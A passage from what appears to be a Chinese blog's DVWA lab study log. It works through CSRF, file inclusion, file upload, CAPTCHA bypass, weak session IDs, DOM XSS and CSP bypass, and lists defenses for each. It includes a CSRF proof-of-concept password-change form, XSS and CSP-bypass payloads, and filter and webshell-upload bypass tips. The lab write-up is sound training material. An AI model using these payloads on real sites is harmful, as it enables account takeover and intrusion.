+<p>钓鱼页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://localhost/dvwa/vulnerabilities/csrf/&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&amp;#95;new&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&amp;#95;conf&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot; /&gt;</span><br><span class="line">	  &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;17936e9fa62e18734489c63edbcdfd16&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>只要将利用xss获取的token放入表单中就可以了</p>
+<p>可以将xss的payload放在store类xss中，这样我就可以不断的获取token。</p>
+<p>这个攻击需要两步。</p>
+<p>第一步，受害者点击xss页面，token泄露。</p>
+<p>第二步，受害者点击钓鱼页面，发生恶意修改密码。</p>
+<p>不过话说回来，我都能通过xss拿到token了，如果要是可以拿走cookie，那我就能改他密码了，即不用第二步。</p>
+<h3 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h3><p>在impossible难度下，多加了一个旧密码的验证。</p>
+<h3 id="防御方式-2"><a href="#防御方式-2" class="headerlink" title="防御方式"></a>防御方式</h3><p>1.对请求头部里的referer字段进行验证，确保请求来自受信任的域名。</p>
+<p>2.设置不可伪造的csrf_token，用来验证请求是否合法。</p>
+<p>3.如果是修改密码或其他修改重要信息的页面，可以要求用户输入一个可以来验证身份的信息。</p>
+<h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>文件包含漏洞，页面带有文件包含的功能，攻击者可以让页面去包含一些恶意的页面或通过协议去获取敏感信息，甚至获取webshell。</p>
+<p>靶场提给的场景是一个带有文件包含功能的页面，用户可以包含三个网站提供的文件，分别为file1.php，file2.php，file3.php。</p>
+<h3 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h3><p>没有做任何防护，可以去包含服务器上的敏感文件，或者使用http/https协议去远程包含恶意文件，还可以使用伪协议去执行代码或获取文件。</p>
+<h3 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h3><p>对文件进行了处理，过滤了http/https，防止包含远程文件。过滤了 ../，防止访问其他目录下的文件。</p>
+<p>可以使用双写绕过这两个过滤策略。</p>
+<p>此外还可以使用伪协议去执行代码，或获取敏感文件。</p>
+<p>过滤了../，导致不能使用相对路径，但是如果能知道绝对路径的话，还是可以获取服务器上的的文件。</p>
+<h3 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h3><p>网站做白名单限制，只有file开头的文件和include.php才能正常包含。</p>
+<p>这导致了大部分协议不能使用。但是file协议还能使用。</p>
+<p>可以结合文件上传漏洞来利用。</p>
+<h3 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h3><p>做了更加严格的白名单限制。</p>
+<h3 id="防御方式-3"><a href="#防御方式-3" class="headerlink" title="防御方式"></a>防御方式</h3><p>1.设置白名单，限制可包含的文件。</p>
+<p>2.如非必须，请勿开启远程包含。如一定要开启，一定要去验证请求的url是否受合法（验证域名是否可信任）。</p>
+<p>3.对协议进行限制，过来掉不是必须的协议。</p>
+<h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p>文件上传漏洞，网站提供文件上传功能，攻击者可以上传恶意文件来攻击网站。</p>
+<p>靶场提供的场景是一个简单的文件上传功能。</p>
+<h3 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h3><p>没有任何防护，可以直接上传一句话木马。</p>
+<h3 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h3><p>只是对上传的文件类型做了判断，没有对后缀做判断。</p>
+<p>只要修改content-type就可以了。</p>
+<h3 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h3><p>修改content-type无效，可能对后缀做了检测。</p>
+<p>上传奇怪后缀的文件失败，可能是白名单。</p>
+<p>上传路径不可控。</p>
+<p>带有文件头检测，图片马需要加文件头才上传。</p>
+<h3 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h3><p>对上传的文件进行重构，这意味着图片马里的木马会被清除。</p>
+<h3 id="防御方式-4"><a href="#防御方式-4" class="headerlink" title="防御方式"></a>防御方式</h3><p>1.设置白名单，限制可上传的文件。</p>
+<p>2.对上传的文件进行检测，防止文件里携带恶意代码。尤其是图片，极有可能包含有一句话木马。</p>
+<p>3.验证后缀。</p>
+<h2 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h2><p>验证功能可以被攻击者绕过。</p>
+<p>靶场提供的场景是一个修改密码的页面，这个页面带有验证功能。</p>
+<h3 id="Low-5"><a href="#Low-5" class="headerlink" title="Low"></a>Low</h3><p>分析源码以后，发现修改密码分为两步。</p>
+<p>第一步，验证。</p>
+<p>第二步，更新数据库。</p>
+<p>POST的参数中，step参数表示当前是修改密码的第几步。</p>
+<p>将step修改为2，即可绕过第一步验证。</p>
+<h3 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h3><p>在第二步中，POST的参数多了一个passed_captcha，用来判断是否经过第一步验证。</p>
+<p>直接构造第二步的数据包，加上一个passed_captcha参数，内容随意，程序只验证是否有该参数。</p>
+<h3 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h3><p>分析源码后发现，程序将验证用户和修改密码两步合为一个数据包。</p>
+<p>程序验证用户有两种验证方法。</p>
+<p>1.验证$_POST[‘g-recaptcha-response’]是否与$_DVWA[ ‘recaptcha_private_key’ ]一致。</p>
+<p>2.验证$_POST[‘g-recaptcha-response’]是否为’hidd3n_valu3’，并且请求头中的user_agent是否为’reCAPTCHA’。</p>
+<p>第一种验证方法不太好绕过，因为很难拿到recaptcha_private_key。</p>
+<p>第二种验证方法可以绕过，只要在请求的body部分，添加g-recaptcha-response=hidd3n_valu3，并且将请求头中的user_agent修改为reCAPTCHA即可。</p>
+<h3 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h3><p>要求提供旧密码，并对旧密码进行了验证。去掉了High里验证用户的第二种方法。</p>
+<h3 id="防御方式-5"><a href="#防御方式-5" class="headerlink" title="防御方式"></a>防御方式</h3><p>1.设置验证次数，防止攻击者枚举验证码进行爆破。</p>
+<p>2.如果第一步的验证成功了，做个标记。</p>
+<h2 id="Weak-Session-IDs"><a href="#Weak-Session-IDs" class="headerlink" title="Weak Session IDs"></a>Weak Session IDs</h2><p>弱Session ID漏洞。Session ID有规律，可以被攻击者伪造。</p>
+<p>靶场提供的场景是一个可以生成Session id的页面。</p>
+<h3 id="Low-6"><a href="#Low-6" class="headerlink" title="Low"></a>Low</h3><p>只是单纯的数字加一。</p>
+<h3 id="Medium-6"><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h3><p>这关变成了时间戳。</p>
+<h3 id="High-6"><a href="#High-6" class="headerlink" title="High"></a>High</h3><p>这关也是数字加一，但是对数字进行了md5加密。</p>
+<h3 id="Impossible-6"><a href="#Impossible-6" class="headerlink" title="Impossible"></a>Impossible</h3><p>这关的ID是一个随机数+时间戳+固定字符串（“impossible”）经过sha1运算的结果。</p>
+<h3 id="防御方式-6"><a href="#防御方式-6" class="headerlink" title="防御方式"></a>防御方式</h3><p>1.对Session进行加密</p>
+<p>2.用随机数去创建Session，最好带上一个不容易猜到的字符串，防止随机数被破解。</p>
+<h2 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS (DOM)"></a>XSS (DOM)</h2><p>XSS的一种，利用修改DOM文档来实现xss攻击。与反射型xss区别在于，DOM型不需要传到服务器。</p>
+<p>靶场提供的场景是选择页面语言的功能。</p>
+<h3 id="Medium-7"><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">	&lt;select name=&quot;default&quot;&gt;</span><br><span class="line">		&lt;script&gt;</span><br><span class="line">			if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123;</span><br><span class="line">				var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span><br><span class="line">				document.write(&quot;&lt;option value=&#x27;&quot; + lang + &quot;&#x27;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">			&#125;    </span><br><span class="line">			document.write(&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">			document.write(&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">			document.write(&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">			document.write(&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">		&lt;/script&gt;</span><br><span class="line">	&lt;/select&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第五行，lang的值是document.location.href.substring(document.location.href.indexOf(“default=”)+8);</p>
+<p>document.location.href 指的是浏览器里的url。</p>
+<p>str.substring(pos)函数可以获取str从pos到结尾的字符串。</p>
+<p>document.location.href.indexOf(“default=”) 返回的是字符串”default=”在url中的位置。+8以后就是url中default的值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylod：English #&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>ps：#后面的内容不会传到服务器。</p>
+<p>ps：English后面要带有空格。</p>
+<p>由于#&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;不会被传到服务器，所以它会被js代码读取，并放到html里面。</p>
+<p>若要尝试使用其他XSS payload，如img、svg等标签，因为select标签内只允许内嵌option标签，而option标签中能内嵌script标签但不能内嵌img等标签，因此需要在注入时先闭合option和select标签从而使注入的标签逃逸出来执行XSS</p>
+<h3 id="High-7"><a href="#High-7" class="headerlink" title="High"></a>High</h3><p>如果嫌麻烦，直接上Medium的payload就好了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">&#x27;&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>emmm，只能用Medium的那种思路，因为服务器设置了白名单，限制了参数的内容。</p>
+<h3 id="Impossible-7"><a href="#Impossible-7" class="headerlink" title="Impossible"></a>Impossible</h3><p>因为服务器的设置，浏览器没有对url中的代码进行url解码，所以js代码无法生效。</p>
+<p>这是Medium的js代码</p>
+<p><img src="https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/XSS-DOM-medium%E4%BB%A3%E7%A0%81.png?raw=true" alt="image-3"></p>
+<p>这是Impossible的js代码</p>
+<p><img src="https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/XSS-DOM-Impossible%E4%BB%A3%E7%A0%81.png?raw=true" alt="image-3"></p>
+<p>可以看出来，Impossible的js代码没有对url的内容进行解码。</p>
+<p>ps：浏览器为了防止xss，是默认不对url进行解码的。</p>
+<h3 id="防御方式-7"><a href="#防御方式-7" class="headerlink" title="防御方式"></a>防御方式</h3><p>1.对用户的输入进行实体编码。</p>
+<p>2.不要随便对用户的输入进行url解码，浏览器一般默认不解码。</p>
+<p>3.小心callback的名称，很容易被xss。</p>
+<h2 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass</h2><p>什么是CSP？</p>
+<p>Content Security Policy，内容安全策略。</p>
+<p>用来限制网站可执行的js脚本来源。</p>
+<p>在服务器响应的头部中带有Content-Security-Policy。</p>
+<p>用来标识哪些资源是允许加载的。</p>
+<p>CSP Bypass，内容安全策略被攻击者绕过。</p>
+<h3 id="Low-7"><a href="#Low-7" class="headerlink" title="Low"></a>Low</h3><p><a target="_blank" rel="noopener" href="https://pastebin.com/">https://pastebin.com/</a> 是受信任的。</p>
+<p>可以到这个网站写一个带有js代码的页面，然后将这个页面的链接放到输入框中。</p>
+<h3 id="Medium-8"><a href="#Medium-8" class="headerlink" title="Medium"></a>Medium</h3><p>Content-Security-Policy: script-src ‘self’ ‘unsafe-inline’ ‘nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=’;</p>
+<p>这个策略的意思是，script-src 指js脚本的来源，‘self’，只能来自当前域名，‘unsafe-inline’，允许页面内嵌脚本，‘nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=’，页面内嵌的脚本要带有这个参数，才可以执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script nonce=&#x27;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="High-8"><a href="#High-8" class="headerlink" title="High"></a>High</h3><p><img src="https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/CSP-code1.png?raw=true" alt="image-2"></p>
+<p>这是High的代码。看到这里有一个$_POST[‘include’]是可控的。</p>
+<p><img src="https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/CSP-code2.png?raw=true" alt="image-2"></p>
+<p>这是jsonp.php的代码。在这里，$callback也是一个可控的参数。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;source/jsonp.php?callback=alert(&#x27;hacked&#x27;);&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将上面这个payload作为include的值，用POST发送给<a target="_blank" rel="noopener" href="http://localhost/dvwa/vulnerabilities/csp/%E9%A1%B5%E9%9D%A2%E3%80%82">http://localhost/dvwa/vulnerabilities/csp/页面。</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">	点击按钮--&gt;发起请求jsonp.php?callback=solveSum;</span><br><span class="line">	发起请求jsonp.php?callback=solveSum--&gt;返回要执行的JS代码;</span><br><span class="line">	返回要执行的JS代码--&gt;浏览器执行JS代码;</span><br><span class="line">	</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
+
+<p>浏览器会将jsonp.php返回的内容当成js代码解析。而从上面的代码，我们得知，callback是可控的，我们可以将xss代码做callback传给jsonp.php，形成xss注入。</p>
+<h3 id="Impossible-8"><a href="#Impossible-8" class="headerlink" title="Impossible"></a>Impossible</h3><p>限制了callback名称，不允许用户自定义名称。</p>
+<h3 id="防御方式-8"><a href="#防御方式-8" class="headerlink" title="防御方式"></a>防御方式</h3><p>1.更严谨的内容安全策略。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">DVWA靶场学习记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Brute-Force"><span class="toc-number">1.2.</span> <span class="toc-text">Brute Force</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low"><span class="toc-number">1.2.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium"><span class="toc-number">1.2.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High"><span class="toc-number">1.2.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible"><span class="toc-number">1.2.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Command-Injection"><span class="toc-number">1.3.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-1"><span class="toc-number">1.3.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-1"><span class="toc-number">1.3.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-1"><span class="toc-number">1.3.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">1.4.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-2"><span class="toc-number">1.4.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-2"><span class="toc-number">1.4.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-2"><span class="toc-number">1.4.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-2"><span class="toc-number">1.4.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-2"><span class="toc-number">1.4.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">1.5.</span> <span class="toc-text">File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-3"><span class="toc-number">1.5.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-3"><span class="toc-number">1.5.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-3"><span class="toc-number">1.5.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-3"><span class="toc-number">1.5.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-3"><span class="toc-number">1.5.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Upload"><span class="toc-number">1.6.</span> <span class="toc-text">File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-4"><span class="toc-number">1.6.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-4"><span class="toc-number">1.6.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-4"><span class="toc-number">1.6.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-4"><span class="toc-number">1.6.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-4"><span class="toc-number">1.6.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Insecure-CAPTCHA"><span class="toc-number">1.7.</span> <span class="toc-text">Insecure CAPTCHA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-5"><span class="toc-number">1.7.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-5"><span class="toc-number">1.7.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-5"><span class="toc-number">1.7.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-5"><span class="toc-number">1.7.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-5"><span class="toc-number">1.7.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weak-Session-IDs"><span class="toc-number">1.8.</span> <span class="toc-text">Weak Session IDs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-6"><span class="toc-number">1.8.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-6"><span class="toc-number">1.8.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-6"><span class="toc-number">1.8.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-6"><span class="toc-number">1.8.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-6"><span class="toc-number">1.8.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-DOM"><span class="toc-number">1.9.</span> <span class="toc-text">XSS (DOM)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-7"><span class="toc-number">1.9.1.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-7"><span class="toc-number">1.9.2.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-7"><span class="toc-number">1.9.3.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-7"><span class="toc-number">1.9.4.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP-Bypass"><span class="toc-number">1.10.</span> <span class="toc-text">CSP Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-7"><span class="toc-number">1.10.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-8"><span class="toc-number">1.10.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-8"><span class="toc-number">1.10.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-8"><span class="toc-number">1.10.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-8"><span class="toc-number">1.10.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&text=DVWA靶场学习记录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=DVWA靶场学习记录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&is_video=false&description=DVWA靶场学习记录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DVWA靶场学习记录&body=Check out this article: http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=DVWA靶场学习记录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=DVWA靶场学习记录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=DVWA靶场学习记录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=DVWA靶场学习记录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
